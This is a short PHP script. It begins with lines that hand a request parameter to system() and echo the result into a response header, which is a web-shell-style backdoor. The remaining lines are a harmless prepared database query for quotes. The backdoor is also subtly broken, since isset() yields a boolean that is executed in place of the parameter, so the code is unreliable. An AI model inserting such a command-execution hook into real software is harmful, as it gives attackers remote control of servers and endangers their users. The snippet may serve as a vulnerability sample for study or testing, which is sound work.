<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

$db = ezcDbInstance::get();
$stmt = $db->prepare( 'SELECT * FROM quotes where author = :author' );
$stmt->bindValue( ':author', 'Robert Foster' );

$stmt->execute();
$rows = $stmt->fetchAll();

?>
